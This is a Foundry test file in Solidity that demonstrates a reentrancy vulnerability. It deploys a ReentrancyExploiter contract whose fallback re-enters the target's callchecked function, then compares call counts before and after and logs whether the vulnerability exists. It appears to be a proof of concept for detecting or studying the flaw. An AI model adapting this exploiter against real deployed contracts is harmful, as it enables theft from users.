// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/unchecked_return_value.sol";

contract ReturnValueReentrancyTest is Test {
    ReturnValue public target;
    ReentrancyExploiter public exploiter;

    function setUp() public {
        target = new ReturnValue();
        exploiter = new ReentrancyExploiter(target);
    }

    function testReentrancy() public {
        console.log("--- BEFORE-Trigger Attack ---");
        // Pre-attack state: call stats for exploiter
        (uint256 preExploiterCalls, uint256 preExploiterSuccessful) = target.getCallStats(address(exploiter));
        // Pre-attack state: global call stats
        uint256 preTotalCalls = target.totalCalls();
        uint256 preTotalSuccessful = target.totalSuccessfulCalls();

        console.log("Pre-attack values:");
        console.log("Exploiter calls:", preExploiterCalls);
        console.log("Exploiter successful calls:", preExploiterSuccessful);
        console.log("Total calls:", preTotalCalls);
        console.log("Total successful calls:", preTotalSuccessful);

        console.log("--- Trigger Attack ---");
        // Perform attack with 2-step re-entrancy
        exploiter.attack();

        console.log("--- AFTER-Trigger Attack ---");
        // Post-attack state: call stats for exploiter
        (uint256 postExploiterCalls, uint256 postExploiterSuccessful) = target.getCallStats(address(exploiter));
        // Post-attack state: global call stats
        uint256 postTotalCalls = target.totalCalls();
        uint256 postTotalSuccessful = target.totalSuccessfulCalls();

        console.log("Post-attack values:");
        console.log("Exploiter calls:", postExploiterCalls);
        console.log("Exploiter successful calls:", postExploiterSuccessful);
        console.log("Total calls:", postTotalCalls);
        console.log("Total successful calls:", postTotalSuccessful);

        // Verify changes were as expected
        bool callsChanged = (postExploiterCalls == preExploiterCalls + 2) &&
                            (postTotalCalls == preTotalCalls + 2);
        bool successChanged = (postExploiterSuccessful == preExploiterSuccessful + 2) &&
                              (postTotalSuccessful == preTotalSuccessful + 2);

        if (callsChanged && successChanged) {
            console.log("Vulnerability Exists: reentrancy attack manipulated call counts");
        } else {
            console.log("Vulnerability not Exist: state changes don't match reentrancy patterns");
        }
    }
}

contract ReentrancyExploiter {
    ReturnValue public immutable target;
    uint private attackStage;

    constructor(ReturnValue _target) {
        target = _target;
    }

    function attack() public {
        attackStage = 1;
        target.callchecked(address(this));
    }

    // Fallback function triggered by external call
    fallback() external {
        if (attackStage < 2) {
            attackStage++;
            // Re-enter vulnerable function (call #2)
            target.callchecked(address(this));
        }
    }
}